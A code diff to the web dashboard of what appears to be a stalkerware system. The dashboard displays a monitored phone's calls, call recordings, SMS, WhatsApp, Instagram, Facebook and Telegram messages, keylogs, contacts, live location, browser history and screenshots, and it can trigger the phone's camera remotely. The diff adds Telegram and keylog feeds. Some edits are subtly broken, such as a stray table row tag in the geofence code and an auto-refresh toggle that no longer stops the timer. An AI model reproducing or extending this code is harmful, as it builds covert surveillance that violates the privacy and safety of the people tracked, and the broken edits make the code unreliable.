@@ -78,10 +78,7 @@
       backdrop-filter: blur(5px);
     }
     .top-bar h2 { color: #0f0; text-shadow: 0 0 3px #0f0; }
-    .top-bar .btn-group {
-      display: flex;
-      gap: 10px;
-    }
+    .top-bar .btn-group { display: flex; gap: 10px; }
     .dashboard-card {
       background: rgba(0, 0, 0, 0.75);
       border-radius: 24px;
@@ -109,16 +106,8 @@
     }
     .stat-number { font-size: 32px; font-weight: 800; color: #0f0; }
     .table-responsive { overflow-x: auto; }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      color: #cfd5e1;
-    }
-    th, td {
-      padding: 12px;
-      text-align: left;
-      border-bottom: 1px solid #0f0;
-    }
+    table { width: 100%; border-collapse: collapse; color: #cfd5e1; }
+    th, td { padding: 12px; text-align: left; border-bottom: 1px solid #0f0; }
     th { background: rgba(0, 0, 0, 0.7); font-weight: 600; color: #0f0; }
     .tab-content { display: none; }
     .tab-content.active { display: block; }
@@ -131,11 +120,7 @@
       color: #0f0;
       transition: 0.2s;
     }
-    .btn-outline:hover {
-      background: #0f0;
-      color: black;
-      box-shadow: 0 0 10px #0f0;
-    }
+    .btn-outline:hover { background: #0f0; color: black; box-shadow: 0 0 10px #0f0; }
     .btn-primary {
       background: rgba(0, 0, 0, 0.6);
       color: #0f0;
@@ -145,22 +130,13 @@
       cursor: pointer;
       transition: 0.2s;
     }
-    .btn-primary:hover {
-      background: #0f0;
-      color: black;
-      box-shadow: 0 0 10px #0f0;
-    }
+    .btn-primary:hover { background: #0f0; color: black; box-shadow: 0 0 10px #0f0; }
     img.screenshot-thumb { max-width: 150px; max-height: 150px; border-radius: 8px; margin: 5px; border: 1px solid #0f0; cursor: pointer; }
     #map { height: 400px; border-radius: 20px; margin-bottom: 20px; border: 1px solid #0f0; background: #111; }
     .device-status { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; }
     .status-online { background: #0f0; color: black; }
     .status-offline { background: #f00; color: white; }
-    .map-controls {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 15px;
-      justify-content: flex-end;
-    }
+    .map-controls { display: flex; gap: 10px; margin-bottom: 15px; justify-content: flex-end; }
     .map-controls button {
       background: rgba(0,0,0,0.6);
       border: 1px solid #0f0;
@@ -170,18 +146,8 @@
       cursor: pointer;
       transition: 0.2s;
     }
-    .map-controls button:hover {
-      background: #0f0;
-      color: black;
-      box-shadow: 0 0 8px #0f0;
-    }
-    .camera-preview {
-      max-width: 100%;
-      max-height: 500px;
-      border: 1px solid #0f0;
-      margin-top: 20px;
-      display: none;
-    }
+    .map-controls button:hover { background: #0f0; color: black; box-shadow: 0 0 8px #0f0; }
+    .camera-preview { max-width: 100%; max-height: 500px; border: 1px solid #0f0; margin-top: 20px; display: none; }
     .modal {
       display: none;
       position: fixed;
@@ -192,27 +158,9 @@
       height: 100%;
       background-color: rgba(0,0,0,0.9);
     }
-    .modal-content {
-      margin: auto;
-      display: block;
-      max-width: 90%;
-      max-height: 90%;
-      margin-top: 50px;
-    }
-    .close-modal {
-      position: absolute;
-      top: 20px;
-      right: 35px;
-      color: #0f0;
-      font-size: 40px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    .loading {
-      text-align: center;
-      padding: 20px;
-      color: #0f0;
-    }
+    .modal-content { margin: auto; display: block; max-width: 90%; max-height: 90%; margin-top: 50px; }
+    .close-modal { position: absolute; top: 20px; right: 35px; color: #0f0; font-size: 40px; font-weight: bold; cursor: pointer; }
+    .loading { text-align: center; padding: 20px; color: #0f0; }
     @media (max-width: 768px) { .sidebar { width: 70px; } .sidebar a span { display: none; } .main-content { margin-left: 70px; } }
   </style>
 </head>
@@ -232,10 +180,11 @@
       <li><a href="#" data-tab="devices"><i class="fas fa-mobile-alt"></i><span> Devices</span></a></li>
       <li><a href="#" data-tab="calls"><i class="fas fa-phone"></i><span> Calls</span></a></li>
       <li><a href="#" data-tab="recordings"><i class="fas fa-microphone-alt"></i><span> Call Recordings</span></a></li>
-      <li><a href="#" data-tab="messages"><i class="fas fa-envelope"></i><span> Messages</span></a></li>
+      <li><a href="#" data-tab="messages"><i class="fas fa-envelope"></i><span> SMS Messages</span></a></li>
       <li><a href="#" data-tab="social-whatsapp"><i class="fab fa-whatsapp"></i><span> WhatsApp</span></a></li>
       <li><a href="#" data-tab="social-instagram"><i class="fab fa-instagram"></i><span> Instagram</span></a></li>
       <li><a href="#" data-tab="social-facebook"><i class="fab fa-facebook"></i><span> Facebook</span></a></li>
+      <li><a href="#" data-tab="social-telegram"><i class="fab fa-telegram"></i><span> Telegram</span></a></li>
       <li><a href="#" data-tab="contacts"><i class="fas fa-address-book"></i><span> Contacts</span></a></li>
       <li><a href="#" data-tab="locations"><i class="fas fa-map-marker-alt"></i><span> Locations</span></a></li>
       <li><a href="#" data-tab="browser"><i class="fas fa-globe"></i><span> Browser History</span></a></li>
@@ -251,7 +200,7 @@
   
   <div class="main-content">
     <div class="top-bar">
-      <h2>Welcome, <span id="userName">User</span></h2>
+      <h2>Welcome, <span id="userName">Admin</span></h2>
       <div class="btn-group">
         <button id="refreshBtn" class="btn-outline"><i class="fas fa-sync-alt"></i> Refresh</button>
         <button id="autoRefreshToggleBtn" class="btn-outline">⏱️ Auto-Refresh ON</button>
@@ -309,17 +258,16 @@
             <tbody></tbody>
           </table>
         </div>
-        <p class="note" style="margin-top: 20px; color: #0f0;">Note: Call recording feature is under development. Android client will upload recordings when online.</p>
       </div>
     </div>
 
-    <!-- All Messages Tab -->
+    <!-- SMS Messages Tab -->
     <div id="messages" class="tab-content">
       <div class="dashboard-card">
-        <div class="card-title">All Messages</div>
+        <div class="card-title">SMS Messages</div>
         <div class="table-responsive">
           <table id="messagesTable">
-            <thead><tr><th>App</th><th>Contact</th><th>Message</th><th>Time</th></tr></thead>
+            <thead><tr><th>Contact</th><th>Message</th><th>Time</th></tr></thead>
             <tbody></tbody>
           </table>
         </div>
@@ -331,8 +279,8 @@
       <div class="dashboard-card">
         <div class="card-title"><i class="fab fa-whatsapp"></i> WhatsApp Messages</div>
         <div class="table-responsive">
-          <table class="social-table" data-app="whatsapp">
-            <thead><tr><th>Contact</th><th>Message</th><th>Time</th></tr></thead>
+          <table id="whatsappTable">
+            <thead><tr><th>Sender</th><th>Message</th><th>Time</th></tr></thead>
             <tbody></tbody>
           </table>
         </div>
@@ -343,8 +291,8 @@
       <div class="dashboard-card">
         <div class="card-title"><i class="fab fa-instagram"></i> Instagram Messages</div>
         <div class="table-responsive">
-          <table class="social-table" data-app="instagram">
-            <thead><tr><th>Contact</th><th>Message</th><th>Time</th></tr></thead>
+          <table id="instagramTable">
+            <thead><tr><th>Sender</th><th>Message</th><th>Time</th></tr></thead>
             <tbody></tbody>
           </table>
         </div>
@@ -355,8 +303,20 @@
       <div class="dashboard-card">
         <div class="card-title"><i class="fab fa-facebook"></i> Facebook Messages</div>
         <div class="table-responsive">
-          <table class="social-table" data-app="facebook">
-            <thead><tr><th>Contact</th><th>Message</th><th>Time</th></tr></thead>
+          <table id="facebookTable">
+            <thead><tr><th>Sender</th><th>Message</th><th>Time</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <div id="social-telegram" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title"><i class="fab fa-telegram"></i> Telegram Messages</div>
+        <div class="table-responsive">
+          <table id="telegramTable">
+            <thead><tr><th>Sender</th><th>Message</th><th>Time</th></tr></thead>
             <tbody></tbody>
           </table>
         </div>
@@ -369,7 +329,7 @@
         <div class="card-title">Contacts</div>
         <div class="table-responsive">
           <table id="contactsTable">
-            <thead><tr><th>Name</th><th>Number</th><th>Email</th></tr></thead>
+            <thead><tr><th>Name</th><th>Number</th></tr></thead>
             <tbody></tbody>
           </table>
         </div>
@@ -394,13 +354,13 @@
       </div>
     </div>
 
-    <!-- Browser Tab -->
+    <!-- Browser History Tab -->
     <div id="browser" class="tab-content">
       <div class="dashboard-card">
         <div class="card-title">Browser History</div>
         <div class="table-responsive">
           <table id="browserTable">
-            <thead><tr><th>URL</th><th>Title</th><th>Visit Time</th><th>Frequency</th></tr></thead>
+            <thead><tr><th>URL</th><th>Title</th><th>Visit Time</th></tr></thead>
             <tbody></tbody>
           </table>
         </div>
@@ -558,7 +518,6 @@
     let token = localStorage.getItem('token');
     if (!token) window.location.href = 'login.html';
 
-    // Helper function for API calls with error handling
     async function fetchAPI(endpoint, options = {}) {
       try {
         const res = await fetch(`${API_BASE}${endpoint}`, {
@@ -598,30 +557,53 @@
         const s = stats.stats;
         document.getElementById('statsGrid').innerHTML = `
           <div class="stat-box"><div class="stat-number">${s.totalDevices || 0}</div><div>Devices</div></div>
-          <div class="stat-box"><div class="stat-number">${s.totalMessages || 0}</div><div>Messages</div></div>
+          <div class="stat-box"><div class="stat-number">${s.totalMessages || 0}</div><div>SMS</div></div>
           <div class="stat-box"><div class="stat-number">${s.totalCalls || 0}</div><div>Calls</div></div>
           <div class="stat-box"><div class="stat-number">${s.totalLocations || 0}</div><div>Locations</div></div>
           <div class="stat-box"><div class="stat-number">${s.totalScreenshots || 0}</div><div>Screenshots</div></div>
+          <div class="stat-box"><div class="stat-number">${s.totalSocial || 0}</div><div>Social Msgs</div></div>
         `;
       }
       
-      const recent = await fetchAPI('/data/recent');
-      if (recent && recent.success && recent.data && recent.data.length) {
-        let html = '<div class="table-responsive"><table><thead><tr><th>Type</th><th>Details</th><th>Time</th></tr></thead><tbody>';
-        recent.data.slice(0, 20).forEach(item => {
-          let details = '';
-          if (item.contactName) details = `${item.callType || ''} call with ${item.contactName}`;
-          else if (item.message) details = `Message (${item.app || 'sms'}): ${item.message.substring(0, 50)}`;
-          else if (item.address) details = `Location: ${item.address}`;
-          else if (item.text) details = `Keylog: ${item.text.substring(0, 50)}`;
-          const type = item.callType ? 'Call' : (item.message ? 'Message' : (item.address ? 'Location' : 'Keylog'));
-          html += `<tr><td>${type}</td><td>${details}</td><td>${new Date(item.timestamp).toLocaleString()}</td></tr>`;
-        });
-        html += '</tbody></table></div>';
-        document.getElementById('recentActivity').innerHTML = html;
-      } else {
-        document.getElementById('recentActivity').innerHTML = '<p>No recent activity</p>';
-      }
+      // Get recent activity from multiple sources
+      const [callsRes, messagesRes, locationsRes, keylogsRes, socialRes] = await Promise.all([
+        fetchAPI('/data/calls'),
+        fetchAPI('/data/messages'),
+        fetchAPI('/data/locations'),
+        fetchAPI('/data/keylogs'),
+        fetchAPI('/data/social-messages')
+      ]);
+      
+      let all = [];
+      if (callsRes?.success && callsRes.data) all.push(...callsRes.data);
+      if (messagesRes?.success && messagesRes.data) all.push(...messagesRes.data);
+      if (locationsRes?.success && locationsRes.data) all.push(...locationsRes.data);
+      if (keylogsRes?.success && keylogsRes.data) all.push(...keylogsRes.data);
+      if (socialRes?.success && socialRes.data) all.push(...socialRes.data);
+      
+      all.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+      
+      let html = '<div class="table-responsive"><table><thead><tr><th>Type</th><th>Details</th><th>Time</th></tr></thead><tbody>';
+      all.slice(0, 30).forEach(item => {
+        let details = '';
+        let type = '';
+        if (item.contactName || item.callType) {
+          type = '📞 Call';
+          details = `${item.callType || ''} call with ${item.contactName || item.phoneNumber}`;
+        } else if (item.message) {
+          type = item.app ? `📱 ${item.app.toUpperCase()}` : '💬 SMS';
+          details = `${item.sender || item.contactNumber || 'Unknown'}: ${item.message.substring(0, 60)}`;
+        } else if (item.address) {
+          type = '📍 Location';
+          details = item.address;
+        } else if (item.text) {
+          type = '⌨️ Keylog';
+          details = `${item.appPackage}: ${item.text.substring(0, 60)}`;
+        }
+        html += `<tr><td>${type}</td><td>${details}</td><td>${new Date(item.timestamp).toLocaleString()}</td></tr>`;
+      });
+      html += '</tbody></table></div>';
+      document.getElementById('recentActivity').innerHTML = html || '<p>No recent activity</p>';
     }
 
     // Devices
@@ -676,55 +658,47 @@
       }
     }
 
-    // Messages
-    let allMessages = [];
-    async function loadMessages(appFilter = null) {
-      if (allMessages.length === 0) {
-        const res = await fetchAPI('/data/messages');
-        if (res && res.success) allMessages = res.data || [];
-      }
-      if (appFilter) {
-        return allMessages.filter(msg => msg.app && msg.app.toLowerCase().includes(appFilter.toLowerCase()));
-      }
-      return allMessages;
-    }
-
-    async function loadAllMessages() {
-      const data = await loadMessages();
-      const tbody = document.querySelector('#messagesTable tbody');
-      tbody.innerHTML = '';
-      if (data && data.length) {
-        data.forEach(msg => {
-          const row = `<tr>
-            <td>${msg.app || 'sms'}</td>
-            <td>${msg.contactName || msg.contactNumber || ''}</td>
-            <td>${msg.message || ''}</td>
-            <td>${new Date(msg.timestamp).toLocaleString()}</td>
-          </tr>`;
-          tbody.insertAdjacentHTML('beforeend', row);
-        });
-      } else {
-        tbody.innerHTML = '<tr><td colspan="4">No messages found</td></tr>';
+    // SMS Messages
+    async function loadSMSMessages() {
+      const res = await fetchAPI('/data/messages');
+      if (res && res.success) {
+        const tbody = document.querySelector('#messagesTable tbody');
+        tbody.innerHTML = '';
+        if (res.data && res.data.length) {
+          res.data.forEach(msg => {
+            const row = `<tr>
+              <td>${msg.contactNumber || ''}</td>
+              <td>${msg.message || ''}</td>
+              <td>${new Date(msg.timestamp).toLocaleString()}</td>
+            </tr>`;
+            tbody.insertAdjacentHTML('beforeend', row);
+          });
+        } else {
+          tbody.innerHTML = '<tr><td colspan="3">No SMS messages found</td></tr>';
+        }
       }
     }
 
-    async function loadMessagesIntoTable(tableId, appFilter) {
-      const data = await loadMessages(appFilter);
-      const container = document.querySelector(`#${tableId}`);
-      const tbody = container ? container.querySelector('.social-table tbody') : null;
-      if (!tbody) return;
-      tbody.innerHTML = '';
-      if (data && data.length) {
-        data.forEach(msg => {
-          const row = `<tr>
-            <td>${msg.contactName || msg.contactNumber || ''}</td>
-            <td>${msg.message || ''}</td>
-            <td>${new Date(msg.timestamp).toLocaleString()}</td>
-          </tr>`;
-          tbody.insertAdjacentHTML('beforeend', row);
-        });
-      } else {
-        tbody.innerHTML = '<tr><td colspan="3">No messages found</td></tr>';
+    // Social Messages (WhatsApp, Instagram, Facebook, Telegram)
+    async function loadSocialMessages(appName, tableId) {
+      const res = await fetchAPI('/data/social-messages');
+      if (res && res.success) {
+        const messages = res.data.filter(msg => msg.app === appName);
+        const tbody = document.querySelector(`#${tableId} tbody`);
+        if (!tbody) return;
+        tbody.innerHTML = '';
+        if (messages.length > 0) {
+          messages.forEach(msg => {
+            const row = `<tr>
+              <td>${msg.sender || 'Unknown'}</td>
+              <td>${msg.message || ''}</td>
+              <td>${new Date(msg.timestamp).toLocaleString()}</td>
+            </tr>`;
+            tbody.insertAdjacentHTML('beforeend', row);
+          });
+        } else {
+          tbody.innerHTML = '<tr><td colspan="3">No messages found</td></tr>';
+        }
       }
     }
 
@@ -739,12 +713,11 @@
             const row = `<tr>
               <td>${contact.name || ''}</td>
               <td>${contact.number || ''}</td>
-              <td>${contact.email || ''}</td>
             </tr>`;
             tbody.insertAdjacentHTML('beforeend', row);
           });
         } else {
-          tbody.innerHTML = '<tr><td colspan="3">No contacts found</td></tr>';
+          tbody.innerHTML = '<tr><td colspan="2">No contacts found</td></tr>';
         }
       }
     }
@@ -794,7 +767,8 @@
         }
       } else {
         if (map) map.remove();
-        document.getElementById('map').innerHTML = '<p>No location data available.</p>';
+        const mapDiv = document.getElementById('map');
+        if (mapDiv) mapDiv.innerHTML = '<p>No location data available.</p>';
       }
     }
 
@@ -802,9 +776,7 @@
       if (locationData.length > 0 && map) {
         const latest = locationData[0];
         map.setView([latest.lat, latest.lng], 15);
-        if (latestMarker) {
-          latestMarker.openPopup();
-        }
+        if (latestMarker) latestMarker.openPopup();
       }
     }
 
@@ -848,29 +820,28 @@
       else startLiveTracking();
     }
 
-    // Browser History
+    // Browser History - FIXED ENDPOINT
     async function loadBrowser() {
-      const res = await fetchAPI('/data/browser');
+      const res = await fetchAPI('/data/browser-history');
       if (res && res.success) {
         const tbody = document.querySelector('#browserTable tbody');
         tbody.innerHTML = '';
         if (res.data && res.data.length) {
           res.data.forEach(hist => {
             const row = `<tr>
-              <td><a href="${hist.url}" target="_blank" style="color:#0f0;">${hist.url.substring(0, 50)}</a></td>
+              <td><a href="${hist.url}" target="_blank" style="color:#0f0;">${hist.url?.substring(0, 60) || ''}</a></td>
               <td>${hist.title || ''}</td>
-              <td>${new Date(hist.visitTime).toLocaleString()}</td>
-              <td>${hist.frequency || 1}</td>
+              <td>${new Date(hist.timestamp).toLocaleString()}</td>
             </tr>`;
             tbody.insertAdjacentHTML('beforeend', row);
           });
         } else {
-          tbody.innerHTML = '<tr><td colspan="4">No browser history found</td></tr>';
+          tbody.innerHTML = '<tr><td colspan="3">No browser history found</td></tr>';
         }
       }
     }
 
-    // Screenshots with Modal
+    // Screenshots
     async function loadScreenshots() {
       const res = await fetchAPI('/data/screenshots');
       if (res && res.success) {
@@ -958,8 +929,7 @@
               <td>${ev.name || ''}</td>
               <td>${ev.triggerEvent || ''}</td>
               <td>${ev.centerLat || ''}, ${ev.centerLng || ''}</td>
-              <td>${ev.radius || 0}m</td>
-              <td>${new Date(ev.timestamp).toLocaleString()}</td>
+              <td>${ev.radius || 0}m</td><tr><td>${new Date(ev.timestamp).toLocaleString()}</td>
             </tr>`;
             tbody.insertAdjacentHTML('beforeend', row);
           });
@@ -986,7 +956,7 @@
             tbody.insertAdjacentHTML('beforeend', row);
           });
         } else {
-          tbody.innerHTML = ' hilab<td colspan="4">No app usage data found</td></tr>';
+          tbody.innerHTML = '<tr><td colspan="4">No app usage data found</td></tr>';
         }
       }
     }
@@ -1008,22 +978,20 @@
           }
           const row = `<tr>
             <td>${rec.callId || 'N/A'}</td>
-            <td>${rec.duration || 0}s</td>
-            <td>${new Date(rec.timestamp).toLocaleString()}</td>
-            <td>${audioHtml}</td>
+            <td>${rec.duration || 0}s</td><td>${new Date(rec.timestamp).toLocaleString()}</td><td>${audioHtml}</td>
           </tr>`;
           tbody.insertAdjacentHTML('beforeend', row);
         });
       } else {
         const tbody = document.querySelector('#recordingsTable tbody');
-        if (tbody) tbody.innerHTML = '<tr><td colspan="4">No recordings yet. Feature coming soon.</td></tr>';
+        if (tbody) tbody.innerHTML = '<tr><td colspan="4">No recordings yet</td></tr>';
       }
     }
 
     // Export Functions
     async function exportData() {
       playBeep();
-      const endpoints = ['calls', 'messages', 'contacts', 'locations', 'browser', 'keylogs', 'keyword-alerts', 'geofence', 'app-usage'];
+      const endpoints = ['calls', 'messages', 'contacts', 'locations', 'browser-history', 'keylogs', 'keyword-alerts', 'geofence', 'app-usage', 'social-messages'];
       let allData = [];
       for (let ep of endpoints) {
         const res = await fetchAPI(`/data/${ep}`);
@@ -1056,7 +1024,7 @@
 
     async function exportAsJson() {
       playBeep();
-      const endpoints = ['calls', 'messages', 'contacts', 'locations', 'browser', 'keylogs', 'keyword-alerts', 'geofence', 'app-usage'];
+      const endpoints = ['calls', 'messages', 'contacts', 'locations', 'browser-history', 'keylogs', 'keyword-alerts', 'geofence', 'app-usage', 'social-messages'];
       let allData = {};
       for (let ep of endpoints) {
         const res = await fetchAPI(`/data/${ep}`);
@@ -1110,14 +1078,9 @@
       
       if (res && res.success) {
         document.getElementById('cameraMessage').innerText = 'Command sent. Waiting for photo...';
-        if (autoPhotoPolling) {
-          startPhotoPolling();
-        } else {
-          // Single poll
-          setTimeout(() => pollForPhoto(), 2000);
-        }
+        setTimeout(() => pollForPhoto(), 2000);
       } else {
-        document.getElementById('cameraMessage').innerText = 'Failed to send command: ' + (res?.error || 'Unknown error');
+        document.getElementById('cameraMessage').innerText = 'Failed to send command';
       }
     }
 
@@ -1134,9 +1097,7 @@
 
     function startPhotoPolling() {
       if (photoPollingInterval) clearInterval(photoPollingInterval);
-      photoPollingInterval = setInterval(async () => {
-        await pollForPhoto();
-      }, 3000);
+      photoPollingInterval = setInterval(pollForPhoto, 3000);
     }
 
     function stopPhotoPolling() {
@@ -1170,20 +1131,16 @@
     const modal = document.getElementById('imageModal');
     const closeModal = document.querySelector('.close-modal');
     if (closeModal) {
-      closeModal.onclick = () => {
-        modal.style.display = 'none';
-      };
+      closeModal.onclick = () => { modal.style.display = 'none'; };
     }
     window.onclick = (event) => {
-      if (event.target === modal) {
-        modal.style.display = 'none';
-      }
+      if (event.target === modal) modal.style.display = 'none';
     };
 
-    // ========== AUTO-REFRESH LOGIC ==========
+    // Auto-Refresh Logic
     let refreshInterval = null;
     let autoRefreshActive = true;
-    const AUTO_REFRESH_TIME = 10000;
+    const AUTO_REFRESH_TIME = 15000;
 
     function refreshCurrentTab() {
       const activeTab = document.querySelector('.tab-content.active');
@@ -1194,10 +1151,11 @@
         case 'devices': loadDevices(); break;
         case 'calls': loadCalls(); break;
         case 'recordings': loadRecordings(); break;
-        case 'messages': loadAllMessages(); break;
-        case 'social-whatsapp': loadMessagesIntoTable('social-whatsapp', 'whatsapp'); break;
-        case 'social-instagram': loadMessagesIntoTable('social-instagram', 'instagram'); break;
-        case 'social-facebook': loadMessagesIntoTable('social-facebook', 'facebook'); break;
+        case 'messages': loadSMSMessages(); break;
+        case 'social-whatsapp': loadSocialMessages('whatsapp', 'whatsappTable'); break;
+        case 'social-instagram': loadSocialMessages('instagram', 'instagramTable'); break;
+        case 'social-facebook': loadSocialMessages('facebook', 'facebookTable'); break;
+        case 'social-telegram': loadSocialMessages('telegram', 'telegramTable'); break;
         case 'contacts': loadContacts(); break;
         case 'locations': if (!liveActive) loadLocations(); break;
         case 'browser': loadBrowser(); break;
@@ -1217,13 +1175,6 @@
       }, AUTO_REFRESH_TIME);
     }
 
-    function stopAutoRefresh() {
-      if (refreshInterval) {
-        clearInterval(refreshInterval);
-        refreshInterval = null;
-      }
-    }
-
     const toggleBtn = document.getElementById('autoRefreshToggleBtn');
     if (toggleBtn) {
       toggleBtn.addEventListener('click', () => {
@@ -1231,11 +1182,9 @@
         if (autoRefreshActive) {
           toggleBtn.innerHTML = '⏱️ Auto-Refresh ON';
           toggleBtn.style.background = '';
-          startAutoRefresh();
         } else {
           toggleBtn.innerHTML = '⏱️ Auto-Refresh OFF';
           toggleBtn.style.background = 'rgba(255,0,0,0.2)';
-          stopAutoRefresh();
         }
       });
     }
@@ -1248,12 +1197,12 @@
     startAutoRefresh();
 
     window.addEventListener('beforeunload', () => {
-      stopAutoRefresh();
+      if (refreshInterval) clearInterval(refreshInterval);
       stopLiveTracking();
       stopPhotoPolling();
     });
 
-    // ========== TAB SWITCHING ==========
+    // Tab Switching
     const tabs = document.querySelectorAll('.sidebar a');
     const contents = document.querySelectorAll('.tab-content');
     tabs.forEach(link => {
@@ -1273,10 +1222,11 @@
           case 'devices': loadDevices(); break;
           case 'calls': loadCalls(); break;
           case 'recordings': loadRecordings(); break;
-          case 'messages': loadAllMessages(); break;
-          case 'social-whatsapp': loadMessagesIntoTable('social-whatsapp', 'whatsapp'); break;
-          case 'social-instagram': loadMessagesIntoTable('social-instagram', 'instagram'); break;
-          case 'social-facebook': loadMessagesIntoTable('social-facebook', 'facebook'); break;
+          case 'messages': loadSMSMessages(); break;
+          case 'social-whatsapp': loadSocialMessages('whatsapp', 'whatsappTable'); break;
+          case 'social-instagram': loadSocialMessages('instagram', 'instagramTable'); break;
+          case 'social-facebook': loadSocialMessages('facebook', 'facebookTable'); break;
+          case 'social-telegram': loadSocialMessages('telegram', 'telegramTable'); break;
           case 'contacts': loadContacts(); break;
           case 'locations': loadLocations(); break;
           case 'browser': loadBrowser(); break;
